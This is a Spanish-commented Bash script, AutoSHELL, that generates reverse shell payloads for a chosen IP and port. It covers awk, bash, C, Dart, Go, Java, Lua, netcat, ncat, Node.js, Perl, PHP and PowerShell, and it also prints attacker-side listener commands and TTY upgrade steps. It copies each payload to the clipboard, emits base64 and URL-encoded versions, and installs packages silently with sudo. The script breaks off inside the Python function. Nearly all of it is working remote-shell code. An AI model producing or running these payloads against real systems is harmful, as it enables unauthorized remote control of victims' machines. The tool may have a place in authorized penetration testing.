#!/bin/bash
###########################################
#Desarrollado por russkkov                #
#Horas invertidas = 61                    #
#Si lo sé me hago OnlyFans                #
#Recursos en español                      #
#Versión: 1.0				                      #
#Fecha publicación: 26/06/2022		        #
#Fecha última versión: 26/06/2022	        #
############################################################################################
#Script para generar reverse shell de forma automática indicando únicamente la IP y puerto #
############################################################################################
###########################################
#----------------[ Listas ]---------------#
###########################################
elementos_shell=(
"awk"
"bash"
"c"
"dart"
"gawk"
"golang"
"golang-win"
"java"
"lua"
"nc"
"nc-win"
"ncat"
"nodejs"
"perl"
"perl-win"
"php"
"php-win"
"powershell"
"python"
"python-win"
"regsvr32-win"
"ruby"
"rustcat"
"socat"
"telnet"
"zsh"
)
elementos_msfv=(
"android"
"bash"
"jsp"
"linux"
"macos"
"php"
"war"
"windows"
)
###########################################
#---------------[ Colores ]---------------#
###########################################
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
LIGHT_CYAN="${C}[1;96m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"
###########################################
#----------------[ Ayuda ]----------------#
###########################################
ayuda(){
        echo -e ${YELLOW}"\n[+] Panel de ayuda de AutoSHELL\n"${NC}
        echo -e ${DG}"AutoSHELL es un script para generar una reverse shell, bind reverse shell o meterpreter shell de forma automática siguiendo paso a paso el menú e indicándole la IP y el puerto a utilizar (ver Uso 1)."
        echo -e "También puede generarse la reverse shell usando los parámetros (ver Uso 2).\n"
	echo -e "En la forma de uso 1 y 2 se mostrará el código de la shell en el lenguaje indicado así como codificado en base64 y url.\n\n"
        echo -e ${YELLOW}"[-] Uso 1: autoshell.sh"
        echo -e ${DG}"\tSi se ejecuta el script sin parámetros se abrirá el menú con los tipos de reverse shell disponibles y te guiará paso por paso.\n"
        echo -e ${YELLOW}"[-] Uso 2: autoshell.sh [-t] <tipo> [-i] <IP> [-p] <puerto> [-r][-b][-v]"
        echo -e ${DG}"\tEl tipo de reverse shell se indica con el parámetro -t seguido del nombre (-t bash). Para conocer los tipos de reverse shell disponibles ver Uso 3."
        echo -e "\tLa IP se indica con el parámetro -i seguido de la IP local (-i 127.0.0.0)."
	echo -e "\tEl puerto se indica con el parámetro -p seguido del número de puerto a utilizar (-p 8080)."
        echo -e "\tEl modo de shell (reverse, bind o meterpreter) se indica con -r, -b o -v. Para conocer los tipos de shell disponibles ver Uso 5.\n"
	echo -e ${YELLOW}"[-] Uso 3: autoshell.sh [-e] <puerto>"
	echo -e ${DG}"\tSi se usa el parámetro -e seguido del número de puerto se mostrarán las distintas formas de poner en escucha un puerto.\n"
        echo -e ${YELLOW}"[-] Uso 4: autoshell.sh [-l][--list][--lista]"
        echo -e ${DG}"\tSi se usa el parémtro -l, --list o --lista se mostrarán todos los tipos de reverse shell disponibles y su nombre a usar en el argumento [-t] para cada tipo de modo de los parámetros [-r], [-b] o [-v].\n"${NC}
        echo -e ${YELLOW}"[-] Uso 5: autoshell.sh [-m][--mod][--modo]"
        echo -e ${DG}"\tSi se usa el parémtro -m, --mod o --modo se mostrarán los modos de reverse shell posibles.\n"${NC}
        echo -e ${YELLOW}"[-] Uso 6: autoshell.sh [-c][--code][--codigo] <nombre_tipo>"
        echo -e ${DG}"\tSi se usa el parémtro -c, --code o --codigo seguido del nombre del tipo de reverse shell se mostrará un código de ejemplo para el tipo indicado.\n"${NC}
        echo -e ${YELLOW}"[-] Uso 7: autoshell.sh [-h][--help][--ayuda]"
        echo -e ${DG}"\tSi se usa el parémtro -h, --help o --ayuda se mostrará este panel de ayuda.\n\n"${NC}

}
###########################################
#---------------[ GETOPTS ]---------------#
###########################################
patch_lo() {
	local LO="$1" _OPT="$2"
	shift 2
	eval "[ \$$_OPT = '-' ] || return 0"
	local o=${OPTARG%%=*}
	eval $_OPT=\$o
	if ! echo "$LO" | grep -qw "$o"; then
		eval $_OPT='\?'
      		OPTARG=-$o
      		return 1
   fi
OPTARG=$(echo "$OPTARG" | cut -s -d= -f2-)
	if echo "$LO" | grep -q "\<$o:"; then
      		if [ -z "$OPTARG" ]; then
         		eval OPTARG=\$$((OPTIND))
         			if [ -z "$OPTARG" ]; then
            				eval $_OPT=":"
            				OPTARG=-$o
            				return 1
         			fi
         		OPTIND=$((OPTIND+1))
      		fi
   	elif [ -n "$OPTARG" ]; then
      		OPTARG=""
   	fi
}
patch_dash() {
	[ "$opt" = ":" -o "$opt" = "?" ] && return 0
	if echo $OPTARG | grep -q '^-'; then
		OPTARG=$opt
		opt=":"
	fi
}
###########################################
#------------[ Codificación ]-------------#
###########################################
codificar(){
echo $codigo_cod | base64 > autoshell_base64.txt
urlencode -m $codigo_cod > autoshell_urlencode.txt
echo -e ${LG}"\n[+] Código en base64:\n"${NC}
echo ${DG}
cat autoshell_base64.txt
echo -e ${LG}"\n\n[+] Código en urlencode:\n"${NC}
echo -e ${DG}
cat autoshell_urlencode.txt
echo -e ${NC}"\n"
}

###########################################
#----------[ Funciones Escucha ]----------#
###########################################
escucha(){
	echo -e ${LG}"\n[+] Códigos para puertos en escucha en la máquina local:\n"
	nc_esc
	nc_win_esc
	ncat_esc
	pwncat_esc
	rlwrap_esc
	rustcat_esc
	socat_esc
}
nc_esc(){
	echo -e ${LG}"\tNetcat:\n"
	echo -e ${YELLOW}"\t\tnc -lvnp $puerto\n"${NC}
}
nc_win_esc(){
        echo -e ${LG}"\tNetcat para máquina víctima Windows:\n"
        echo -e ${YELLOW}"\t\trlwrap nc -lvnp $puerto\n"${NC}
}
ncat_esc(){
	echo -e ${LG}"\tNcat:\n"
	echo -e ${YELLOW}"\t\tncat -lvnp $puerto\n"
        echo -e ${LG}"\tNetcat SSL:\n"
        echo -e ${YELLOW}"\t\tncat --ssl -lvnp $puerto\n"${NC}
}
pwncat_esc(){
	echo -e ${LG}"\tPwncat + nc:\n"
	echo -e ${YELLOW}"\t\tpython3 -m pwncat -lp $puerto\n"${NC}
}
rlwrap_esc(){
	echo -e ${LG}"\tRlwrap + nc\n"
	echo -e ${YELLOW}"\t\trlwrap -cAr nc -lvnp $puerto\n"${NC}
}
rustcat_esc(){
	echo -e ${LG}"\tRustcat:\n"
	echo -e ${YELLOW}"\t\trcat -lp $puerto\n"${NC}
}
socat_esc(){
	echo -e ${LG}"\tSocat:\n"
	echo -e ${YELLOW}"\t\tsocat -d -d TCP-LISTEN:$puerto STDOUT\n"
	echo -e ${LG}"\tSocat TTY:\n"
	echo -e ${YELLOW}"\t\tsocat file:\`tty\`,raw,echo=0 tcp-listen:$puerto"${NC}
}
###########################################
#-----------------[ TTY ]-----------------#
###########################################
bash_tty(){
	echo -e ${LG}"\tTratamiento TTY en bash:\n"
	echo -e ${YELLOW}"\t\tscript /dev/null -c bash"
	echo -e ${YELLOW}"\t\tCtrl + z"
	echo -e ${YELLOW}"\t\tstty raw -echo; fg"
	echo -e ${YELLOW}"\t\treset xterm"${NC}
        echo -e ${YELLOW}"\t\texport TERM=xterm"${NC}
        echo -e ${YELLOW}"\t\texport SHELL=bash\n"${NC}
}
python_tty(){
	echo -e ${LG}"\tTratamiento TTY en python:\n"
	echo -e ${YELLOW}"\t\tpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
}
###########################################
#---------------[ XClip ]----------------#
###########################################
xclip_install(){
dpkg -s xclip &> /dev/null
if [ $? -ne 0 ]
then
        echo -e ${LIGHT_MAGENTA}"\t[!] Xclip no está instalado."${NC}
        sleep 3
        echo -e ${DG}"\t\tXclip es una herramienta para el terminal que permite gestionar el portapapeles (copiar y pegar)."${NC}
        sleep 3
        echo -e ${DG}"\t\tSe va a instalar xclip."${NC}
        sleep 3
        echo -e ${DG}"\t\tEs posible que tengas que introducir tu contraseña."${NC}
        sleep 3
        echo -e ${DG}"\t\tEspera mientras se instala, no se mostrará nada por consola.\n"
	sudo apt-get install -y xclip &> /dev/null
        echo -e ${GREEN}"\t\t[+] Se ha instalado xclip correctamente.\n"${NC}
        sleep 2
fi
}
###########################################
#-------------[ URLEncode ]---------------#
###########################################
url_install(){
dpkg -s gridsite-clients &> /dev/null
if [ $? -ne 0 ]
then
        echo -e ${LIGHT_MAGENTA}"\t[!] urlencode no está instalado."${NC}
        sleep 3
        echo -e ${DG}"\t\turlencode es una herramienta para codificar texto a formato url."${NC}
        sleep 3
        echo -e ${DG}"\t\tSe va a instalar urlencode."${NC}
        sleep 3
        echo -e ${DG}"\t\tEs posible que tengas que introducir tu contraseña."${NC}
        sleep 3
        echo -e ${DG}"\t\tEspera mientras se instala, no se mostrará nada por consola.\n"
	sudo apt install -y gridsite-clients &> /dev/null
        echo -e ${GREEN}"\t\t[+] Se ha instalado urlencode correctamente.\n"${NC}
        sleep 2
fi
}
###########################################
#----------[ Funciones reverse ]----------#
###########################################
#awk
awk_reverse(){
	url_install
	xclip_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\tawk  'BEGIN {s=\"/inet/tcp/0/$ip/$puerto\";while(42){do{printf \"> \"|&s;s|&getline c;if(c){while((c|&getline)>0)print \$0|&s;close(c);}}while(c!=\"exit\")close(s);}}' /dev/null" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
	codigo_cod="$(cat codigo.tmp)"
        rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        socat_esc
	codificar
}
#bash
bash_reverse(){
        url_install
        xclip_install
	echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
	echo -e ${YELLOW}
	echo -e "\n\tbash -c 'exec bash -i &>/dev/tcp/$ip/$puerto <&1'\n" > codigo.tmp
	cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
	cat codigo.tmp
	echo -e ${DG}${ITALIC}"\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
	codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
	echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
	bash_tty
	python_tty
	echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
	nc_esc
	socat_esc
	codificar
}
#c
c_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "//Shell generada con AutoSHELL de russkkov"			 > autoshell_reverse_c.c
	echo -e "//"							>> autoshell_reverse_c.c
	echo -e "#include <stdio.h>" 		 			>> autoshell_reverse_c.c
	echo -e "#include <sys/socket.h>" 				>> autoshell_reverse_c.c
	echo -e "#include <sys/types.h>" 				>> autoshell_reverse_c.c
	echo -e "#include <stdlib.h>" 					>> autoshell_reverse_c.c
	echo -e "#include <unistd.h>" 					>> autoshell_reverse_c.c
	echo -e "#include <netinet/in.h>" 				>> autoshell_reverse_c.c
	echo -e "#include <arpa/inet.h>"			 	>> autoshell_reverse_c.c
	echo -e ""							>> autoshell_reverse_c.c
	echo -e "int main(void){" 					>> autoshell_reverse_c.c
	echo -e "\tint port = $puerto;" 				>> autoshell_reverse_c.c
	echo -e "\tstruct sockaddr_in revsockaddr;" 			>> autoshell_reverse_c.c
	echo -e ""							>> autoshell_reverse_c.c
	echo -e "\tint sockt = socket(AF_INET, SOCK_STREAM, 0);" 	>> autoshell_reverse_c.c
	echo -e "\trevsockaddr.sin_family = AF_INET;"  			>> autoshell_reverse_c.c
	echo -e "\trevsockaddr.sin_port = htons(port);"  		>> autoshell_reverse_c.c
	echo -e "\trevsockaddr.sin_addr.s_addr = inet_addr(\"$ip\");" 	>> autoshell_reverse_c.c
	echo -e ""							>> autoshell_reverse_c.c
	echo -e "\tconnect(sockt, (struct sockaddr *) &revsockaddr,"	>> autoshell_reverse_c.c
	echo -e "\tsizeof(revsockaddr));"				>> autoshell_reverse_c.c
	echo -e "\tdup2(sockt, 0);"					>> autoshell_reverse_c.c
	echo -e "\tdup2(sockt, 1);"					>> autoshell_reverse_c.c
	echo -e "\tdup2(sockt, 2);"					>> autoshell_reverse_c.c
        echo -e ""                                                      >> autoshell_reverse_c.c
	echo -e "\tchar * const argv[] = {\"bash\", NULL};"		>> autoshell_reverse_c.c
	echo -e "\texecve(\"/bin/sh\", argv, NULL);"			>> autoshell_reverse_c.c
        echo -e ""                                                      >> autoshell_reverse_c.c
	echo -e "\treturn 0;"						>> autoshell_reverse_c.c
	echo -e "}"							>> autoshell_reverse_c.c
	sudo gcc autoshell_reverse_c.c -o autoshell_c
	echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell_reverse_c.c en la ruta actual con el código de la reverse shell en C\n"${NC}
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo compilado de autoshell_reverse_c.c con el nombre de autoshell_c en la ruta actual\n"${NC}
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n\n"${NC}
        nc_esc
        socat_esc
	codigo_cod="$(cat autoshell_reverse_c.c)"
	codificar
}
#dart
dart_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "//Shell generada con AutoSHELL de russkkov"		 	 > autoshell.dart
	echo -e "import 'dart:io';"						>> autoshell.dart
	echo -e "import 'dart:convert';"					>> autoshell.dart
	echo -e ""								>> autoshell.dart
	echo -e "main() {"							>> autoshell.dart
	echo -e "\tSocket.connect(\"$ip\", $puerto).then((socket) {"		>> autoshell.dart
	echo -e "\t\tsocket.listen((data) {"					>> autoshell.dart
	echo -e "\t\t\tProcess.start('/bin/bash', []).then((Process process) {"	>> autoshell.dart
	echo -e "\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());" >> autoshell.dart
	echo -e "\t\t\t\tprocess.stdout"					>> autoshell.dart
	echo -e "\t\t\t\t.transform(utf8.decoder)"				>> autoshell.dart
	echo -e "\t\t\t\t.listen((output) { socket.write(output); });"		>> autoshell.dart
	echo -e "\t\t\t});"							>> autoshell.dart
	echo -e "\t\t},"							>> autoshell.dart
	echo -e "\t\tonDone: () {"						>> autoshell.dart
	echo -e "\t\t\tsocket.destroy();"					>> autoshell.dart
	echo -e "\t\t});"							>> autoshell.dart
	echo -e "\t});"								>> autoshell.dart
	echo -e "}"								>> autoshell.dart
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell.dart en la ruta actual con el código de la reverse shell en Dart\n"${NC}
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n\n"${NC}
        nc_esc
	codigo_cod="$(cat autoshell.dart)"
	codificar
}
#gawk
gawk_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\tgawk 'BEGIN {P=$puerto;S=\"> \";H=\"$ip\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'" > codigo.tmp
	cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
        socat_esc
	codificar
}
#golang
golang_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$ip:$puerto\");cmd:=exec.Command(\"bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	socat_esc
	codificar
}
golang-win_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "//Shell generada con AutoSHELL de russkkov"                     > autoshell.go
        echo -e "package main"							>> autoshell.go
	echo -e "import ("							>> autoshell.go
	echo -e "\t\"bufio\""							>> autoshell.go
	echo -e "\t\"net\""							>> autoshell.go
	echo -e "\t\"os/exec\""							>> autoshell.go
        echo -e "\t\"syscall\""							>> autoshell.go
	echo -e "\t\"time\""							>> autoshell.go
	echo -e ")"								>> autoshell.go
	echo -e ""								>> autoshell.go
	echo -e "func main() {"							>> autoshell.go
	echo -e "\treverse(\"$ip:$puerto\")"					>> autoshell.go
	echo -e "}"								>> autoshell.go
	echo -e ""								>> autoshell.go
	echo -e "func reverse(host string) {"					>> autoshell.go
	echo -e "\tc, err := net.Dial(\"tcp\", host)"				>> autoshell.go
	echo -e "\tif nil != err {"						>> autoshell.go
	echo -e "\t\tif nil != c {"						>> autoshell.go
	echo -e "\t\t\tc.Close()"						>> autoshell.go
	echo -e "\t\t}"								>> autoshell.go
	echo -e "\t\ttime.Sleep(time.Minute)"					>> autoshell.go
	echo -e "\t\treverse(host)"						>> autoshell.go
	echo -e "\t}"								>> autoshell.go
	echo -e "\tr := bufio.NewReader(c)"					>> autoshell.go
	echo -e "\tfor {"							>> autoshell.go
	echo -e "\t\torder, err := r.ReadString('\\\n')"			>> autoshell.go
	echo -e "\t\tif nil != err {"						>> autoshell.go
	echo -e "\t\t\tc.Close()"						>> autoshell.go
	echo -e "\t\t\treverse(host)"						>> autoshell.go
	echo -e "\t\t\treturn"							>> autoshell.go
	echo -e "\t\t}"								>> autoshell.go
	echo -e "\t\tcmd := exec.Command(\"cmd\", \"/C\", order)"		>> autoshell.go
	echo -e "\t\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}"	>> autoshell.go
	echo -e "\t\tout, _ := cmd.CombinedOutput()"				>> autoshell.go
	echo -e "\t\tc.Write(out)"						>> autoshell.go
	echo -e "\t}"								>> autoshell.go
	echo -e "}"								>> autoshell.go
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell.go en la ruta actual con el código de la reverse shell en Go\n"${NC}
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n\n"${NC}
        nc_esc
	nc_win_esc
	rlwrap_esc
	socat_esc
	codigo_cod="$(cat autoshell.go)"
	codificar
}
#java
java_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e "//Shell generada con AutoSHELL de russkkov"                     	 > autoshell.java
	echo -e "import java.io.BufferedReader;"					>> autoshell.java
	echo -e "import java.io.InputStreamReader;"					>> autoshell.java
	echo -e "public class shell {"							>> autoshell.java
	echo -e "\tpublic static void main(String args[]) {"				>> autoshell.java
	echo -e "\t\tString s;"								>> autoshell.java
	echo -e "\t\tProcess p;"							>> autoshell.java
	echo -e "\t\ttry {"								>> autoshell.java
	echo -e "\t\t\tp = Runtime.getRuntime().exec(\"bash -c \$@|bash 0 echo bash -i >& /dev/tcp/$ip/$puerto 0>&1\");"	>> autoshell.java
	echo -e "\t\t\tp.waitFor();"							>> autoshell.java
	echo -e "\t\t\tp.destroy();"							>> autoshell.java
	echo -e "\t\t} catch (Exception e) {}"						>> autoshell.java
	echo -e "\t}"									>> autoshell.java
	echo -e "}"									>> autoshell.java
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell.java en la ruta actual con el código de la reverse shell en Java\n"${NC}
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codigo_cod="$(cat autoshell.java)"
	codificar
}
#lua
lua_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tlua5.1 -e 'local host, port = \"$ip\", $puerto local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	rlwrap_esc
	codificar
}
#nc
nc_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\trm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $puerto >/tmp/f" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codificar
}
nc-win_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tnc.exe -e cmd.exe $ip $puerto" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_win_esc
	codificar
}
ncat_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\tncat $ip $puerto -e /bin/bash" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codificar
}
nodejs_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e "//Shell generada con AutoSHELL de russkkov"             > autoshell.js
	echo -e "(function(){"						>> autoshell.js
	echo -e "\tvar net = require(\"net\"),"				>> autoshell.js
	echo -e "\tcp = require(\"child_process\"),"			>> autoshell.js
	echo -e "\tsh = cp.spawn(\"/bin/sh\", []);"			>> autoshell.js
	echo -e "\tvar client = new net.Socket();"			>> autoshell.js
	echo -e "\tclient.connect($puerto, \"$ip\", function(){"	>> autoshell.js
	echo -e "\t\tclient.pipe(sh.stdin);"				>> autoshell.js
	echo -e "\t\tsh.stdout.pipe(client);"				>> autoshell.js
	echo -e "\t\tsh.stderr.pipe(client);"				>> autoshell.js
	echo -e "\t});"							>> autoshell.js
	echo -e "\treturn /a/;"						>> autoshell.js
	echo -e "})();"							>> autoshell.js
        echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell.js en la ruta actual con el código de la reverse shell en Node.js\n"${NC}
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codigo_cod="$(cat autoshell.js)"
	codificar
}
perl_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
	echo -e "\n\tperl -e 'use Socket;\$i=\"$ip\";\$p=$puerto;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codificar
}
perl-win_reverse(){
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e "#!usr/bin/perl"                                                         > autoshell.perl
        echo -e "#Shell generada con AutoSHELL de russkkov"				>> autoshell.perl
	echo -e "use IO::Socket;"							>> autoshell.perl
	echo -e "\$ip=\"$ip\";"								>> autoshell.perl
	echo -e "\$puerto=\"$puerto\";"							>> autoshell.perl
	echo -e "conectar(\$ip,\$puerto);"						>> autoshell.perl
	echo -e "tipo();"								>> autoshell.perl
	echo -e "sub conectar {"							>> autoshell.perl
	echo -e "\tsocket(REVERSE, PF_INET, SOCK_STREAM, getprotobyname('tcp'));"	>> autoshell.perl
	echo -e "\tconnect(REVERSE, sockaddr_in(\$puerto,inet_aton(\$ip)));"		>> autoshell.perl
	echo -e "\topen (STDIN,\">&REVERSE\");"						>> autoshell.perl
	echo -e "\topen (STDOUT,\">&REVERSE\");"					>> autoshell.perl
	echo -e "\topen (STDERR,\">&REVERSE\");"					>> autoshell.perl
	echo -e "}"									>> autoshell.perl
	echo -e "sub tipo {"								>> autoshell.perl
	echo -e "\tif ($^O =~/Win32/ig) {"						>> autoshell.perl
	echo -e "\t\tsystem(\"cmd.exe\");"						>> autoshell.perl
	echo -e "\t} else {"								>> autoshell.perl
	echo -e "\t\tsystem(\"bin/bash\");"						>> autoshell.perl
	echo -e "\t}"									>> autoshell.perl
	echo -e "}"									>> autoshell.perl
	echo -e ${YELLOW}${ITALIC}"\t[*] Se ha creado el archivo autoshell.perl en la ruta actual con el código de la reverse shell en perl\n"${NC}
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_win_esc
	codigo_cod="$(cat autoshell.perl)"
	codificar
}
#PHP
php_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\t<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/$ip/$puerto 0>&1'\");?>" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Codigo para el tratamiento de la TTY:\n"
        bash_tty
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_esc
	codificar
}
#Powershell
powershell_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
        echo -e "\n\tpowershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$puerto);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"" > codigo.tmp
        cat codigo.tmp | sed "s/\t//" | tr -d "\n" | xclip -sel clip
        cat codigo.tmp
        echo -e ${DG}${ITALIC}"\n\t[*] Se ha copiado el código en el portapapeles\n\n"${NC}
        codigo_cod="$(cat codigo.tmp)"
	rm codigo.tmp
        echo -e ${LG}"[+] Código para puerto en escucha en la máquina atacante:\n"${NC}
        nc_win_esc
	codificar
}
#python
python_reverse(){
	xclip_install
	url_install
        echo -e ${LG}"\n[+] El código de la reverse shell para la máquina víctima es:"
        echo -e ${YELLOW}
